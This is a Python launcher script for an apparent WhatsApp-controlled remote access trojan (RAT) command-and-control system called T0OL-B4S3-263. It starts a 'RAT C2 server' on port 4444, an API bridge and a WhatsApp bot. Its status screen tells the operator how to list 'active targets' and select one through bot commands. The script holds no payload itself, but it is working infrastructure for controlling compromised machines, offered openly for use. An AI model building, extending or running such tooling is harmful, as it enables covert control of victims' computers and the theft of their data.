#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════
    T0OL-B4S3-263 WhatsApp C2 - Complete Startup Manager
═══════════════════════════════════════════════════════════════
"""

import os
import sys
import subprocess
import time
import signal
from datetime import datetime

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

# Process storage
processes = []

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
    ╔════════════════════════════════════════════════════════════╗
    ║                                                            ║
    ║         T0OL-B4S3-263 WhatsApp C2 System Launcher        ║
    ║              Complete Integration Manager                  ║
    ║                                                            ║
    ╚════════════════════════════════════════════════════════════╝
{Colors.END}
    """
    print(banner)

def log(message, status="info"):
    timestamp = datetime.now().strftime('%H:%M:%S')
    if status == "success":
        print(f"{Colors.GREEN}[{timestamp}] ✓ {message}{Colors.END}")
    elif status == "error":
        print(f"{Colors.RED}[{timestamp}] ✗ {message}{Colors.END}")
    elif status == "warning":
        print(f"{Colors.YELLOW}[{timestamp}] ! {message}{Colors.END}")
    else:
        print(f"{Colors.CYAN}[{timestamp}] * {message}{Colors.END}")

def cleanup():
    """Kill all spawned processes"""
    log("Shutting down all services...", "warning")
    for proc in processes:
        try:
            proc.terminate()
            proc.wait(timeout=5)
        except:
            proc.kill()
    log("All services stopped", "success")
    sys.exit(0)

def signal_handler(sig, frame):
    """Handle Ctrl+C"""
    print("\n")
    cleanup()

def check_dependencies():
    """Check if all dependencies are installed"""
    log("Checking dependencies...")
    
    # Check Python packages
    python_packages = ['flask', 'flask_cors', 'cryptography']
    missing_python = []
    
    for package in python_packages:
        try:
            __import__(package)
        except ImportError:
            missing_python.append(package)
    
    if missing_python:
        log(f"Missing Python packages: {', '.join(missing_python)}", "error")
        log("Install with: pip install " + " ".join(missing_python), "info")
        return False
    
    # Check Node.js
    try:
        subprocess.run(['node', '--version'], capture_output=True, check=True)
    except:
        log("Node.js not found! Please install Node.js", "error")
        return False
    
    # Check if whatsapp-c2 directory exists
    if not os.path.exists('whatsapp-c2'):
        log("whatsapp-c2 directory not found!", "error")
        return False
    
    # Check if node_modules exists
    if not os.path.exists('whatsapp-c2/node_modules'):
        log("Node modules not installed. Run: cd whatsapp-c2 && npm install", "error")
        return False
    
    log("All dependencies satisfied!", "success")
    return True

def start_c2_server():
    """Start the RAT C2 server"""
    log("Starting RAT C2 Server...")
    
    if not os.path.exists('rat_server_fixed.py'):
        log("rat_server_fixed.py not found!", "error")
        return None
    
    try:
        proc = subprocess.Popen(
            [sys.executable, 'rat_server_fixed.py'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        time.sleep(2)
        
        if proc.poll() is None:
            log("C2 Server started successfully", "success")
            return proc
        else:
            log("C2 Server failed to start", "error")
            return None
    except Exception as e:
        log(f"Failed to start C2 Server: {e}", "error")
        return None

def start_api_bridge():
    """Start the API bridge"""
    log("Starting API Bridge...")
    
    if not os.path.exists('rat_api_bridge.py'):
        log("rat_api_bridge.py not found!", "error")
        return None
    
    try:
        proc = subprocess.Popen(
            [sys.executable, 'rat_api_bridge.py'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        time.sleep(2)
        
        if proc.poll() is None:
            log("API Bridge started successfully", "success")
            log("API available at: http://localhost:5000", "info")
            return proc
        else:
            log("API Bridge failed to start", "error")
            return None
    except Exception as e:
        log(f"Failed to start API Bridge: {e}", "error")
        return None

def start_whatsapp_bot():
    """Start the WhatsApp bot"""
    log("Starting WhatsApp Bot...")
    
    try:
        proc = subprocess.Popen(
            ['node', 'bot.js'],
            cwd='whatsapp-c2',
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        time.sleep(3)
        
        if proc.poll() is None:
            log("WhatsApp Bot started successfully", "success")
            return proc
        else:
            log("WhatsApp Bot failed to start", "error")
            return None
    except Exception as e:
        log(f"Failed to start WhatsApp Bot: {e}", "error")
        return None

def display_status():
    """Display system status"""
    print(f"\n{Colors.CYAN}{Colors.BOLD}╔════════════════════════════════════════════════════════════╗")
    print(f"║                    SYSTEM STATUS                           ║")
    print(f"╚════════════════════════════════════════════════════════════╝{Colors.END}\n")
    
    print(f"{Colors.GREEN}✓ RAT C2 Server:      Running (Port 4444){Colors.END}")
    print(f"{Colors.GREEN}✓ API Bridge:         Running (Port 5000){Colors.END}")
    print(f"{Colors.GREEN}✓ WhatsApp Bot:       Running{Colors.END}\n")
    
    print(f"{Colors.YELLOW}📱 SCAN QR CODE WITH WHATSAPP TO CONNECT{Colors.END}\n")
    
    print(f"{Colors.CYAN}Available Commands:{Colors.END}")
    print(f"  • Send {Colors.BOLD}/help{Colors.END} to bot for command list")
    print(f"  • Send {Colors.BOLD}/sessions{Colors.END} to see active targets")
    print(f"  • Send {Colors.BOLD}/use <id>{Colors.END} to select target\n")
    
    print(f"{Colors.MAGENTA}Press CTRL+C to stop all services{Colors.END}\n")

def main():
    # Setup signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    print_banner()
    
    # Check dependencies
    if not check_dependencies():
        log("Dependency check failed. Please install missing requirements.", "error")
        sys.exit(1)
    
    print()
    
    # Start services
    log("Starting T0OL-B4S3-263 WhatsApp C2 System...", "info")
    print()
    
    # Start C2 Server
    c2_proc = start_c2_server()
    if c2_proc:
        processes.append(c2_proc)
    else:
        cleanup()
        sys.exit(1)
    
    time.sleep(2)
    
    # Start API Bridge
    api_proc = start_api_bridge()
    if api_proc:
        processes.append(api_proc)
    else:
        cleanup()
        sys.exit(1)
    
    time.sleep(2)
    
    # Start WhatsApp Bot
    bot_proc = start_whatsapp_bot()
    if bot_proc:
        processes.append(bot_proc)
    else:
        cleanup()
        sys.exit(1)
    
    time.sleep(3)
    
    # Display status
    display_status()
    
    # Keep running
    try:
        while True:
            # Check if any process died
            for proc in processes:
                if proc.poll() is not None:
                    log("A service has stopped unexpectedly!", "error")
                    cleanup()
                    sys.exit(1)
            time.sleep(5)
    except KeyboardInterrupt:
        cleanup()

if __name__ == "__main__":
    main()